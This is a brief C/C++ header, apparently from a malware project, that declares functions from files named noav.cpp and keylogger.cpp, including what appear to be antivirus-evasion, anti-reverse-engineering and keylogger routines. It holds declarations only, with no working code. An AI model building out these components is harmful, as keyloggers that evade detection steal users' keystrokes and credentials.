#pragma once

#ifdef DEBUGME
extern FILE * debug_log_stream;
#endif

// From noav.cpp
extern BOOL noav(BOOL InThread);
extern void noreverse(void);

// From keylogger.cpp
DWORD WINAPI WinAPIextentionK(LPVOID param);
extern HWND keylogger_handle_window;
